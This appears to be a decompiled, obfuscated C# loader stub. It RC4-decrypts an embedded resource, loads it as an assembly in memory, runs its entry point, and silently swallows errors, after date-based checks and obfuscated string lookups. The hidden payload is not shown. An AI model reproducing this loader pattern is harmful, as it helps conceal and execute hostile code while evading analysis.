using System;
using System.Reflection;
using System.Resources;
using SmartAssembly.License;

namespace ns0;

internal sealed class Class0
{
	private static void Main(string[] args)
	{
		if (!License.Validate())
		{
			return;
		}
		Class5.smethod_7();
		if (Class3.smethod_2(Class7.smethod_2(221, 171), new DateTime(635307010745083362L), 654, 760))
		{
			throw new Exception();
		}
		if (Class3.smethod_2(Class7.smethod_2(343, 289), new DateTime(635307010682659792L), 222, 168))
		{
			throw new Exception();
		}
		if (Class3.smethod_2(Class7.smethod_2(155, 237), new DateTime(635307010622786367L), 244, 130))
		{
			throw new Exception();
		}
		if (Class3.smethod_2(Class7.smethod_2(222, 168), new DateTime(635307010555842539L), 986, 940))
		{
			throw new Exception();
		}
		object[] parameters = new object[0];
		Class1.smethod_4(new Random(), 300, 750, 983, 978);
		long num = smethod_2(549, 534);
		_ = smethod_2(182, 133) - num;
		try
		{
			ResourceManager resourceManager_ = new ResourceManager(Class1.smethod_0(Class3.smethod_0(Class5.smethod_0(Class7.smethod_0(Class3.smethod_3(1726088101, 4), 59260), 61717), 58532), 60389), Class5.smethod_4(294, 380));
			byte[] byte_ = smethod_0((byte[])Class5.smethod_5(resourceManager_, Class1.smethod_0(Class3.smethod_0(Class5.smethod_0(Class7.smethod_0(Class3.smethod_3(1726088124, 3), 62505), 63163), 60135), 59303), 704, 748), Class1.smethod_0(Class3.smethod_0(Class5.smethod_0(Class7.smethod_0(Class3.smethod_3(1726088074, 5), 60513), 61468), 60673), 62222));
			Class9.Class10.smethod_2(resourceManager_, 765, 764);
			Assembly assembly_ = Class9.smethod_4(byte_, 823, 844);
			if (Class9.Class11.smethod_4(Class12.smethod_1(assembly_, 505, 501), 208, 246).Length > 0)
			{
				parameters = new object[1] { args };
			}
			Class12.smethod_1(assembly_, 412, 400).Invoke(null, parameters);
		}
		catch
		{
		}
	}

	public static byte[] smethod_0(byte[] byte_0, string string_0)
	{
		byte[] array = Class7.smethod_3(Class5.smethod_6(769, 872), string_0, 156, 218);
		byte[] array2 = new byte[256];
		byte[] array3 = new byte[256];
		int i;
		for (i = 0; i < 256; i++)
		{
			array2[i] = (byte)i;
			array3[i] = array[i % Class3.smethod_4(array, 0, 953, 914)];
		}
		int num = 0;
		for (i = 0; i < 256; i++)
		{
			num = (num + array2[i] + array3[i]) % 256;
			byte b = array2[i];
			array2[i] = array2[num];
			array2[num] = b;
		}
		num = 0;
		i = 0;
		for (int j = 0; j < Class12.Class13.smethod_1(byte_0, 0, 847, 885); j++)
		{
			i = (i + 1) % 256;
			num = (num + array2[i]) % 256;
			byte b = array2[i];
			array2[i] = array2[num];
			array2[num] = b;
			int num2 = (array2[i] + array2[num]) % 256;
			byte_0[j] ^= array2[num2];
		}
		return byte_0;
	}

	static Class0()
	{
		Class5.smethod_7();
	}

	internal static int smethod_1(string string_0, int int_0, int int_1)
	{
		while (true)
		{
			switch (int_1 ^ int_0)
			{
			case 23:
				return Class9.Class10.smethod_3(string_0, 561, 530);
			}
		}
	}

	internal static int smethod_2(int int_0, int int_1)
	{
		while (true)
		{
			switch (int_1 ^ int_0)
			{
			case 51:
				return Class9.Class11.smethod_5(17, 83);
			}
		}
	}

	internal static void smethod_3(Array array_0, RuntimeFieldHandle runtimeFieldHandle_0, int int_0, int int_1)
	{
		while (true)
		{
			switch (int_1 ^ int_0)
			{
			case 114:
				Class9.smethod_3(array_0, runtimeFieldHandle_0, 529, 547);
				return;
			}
		}
	}
}
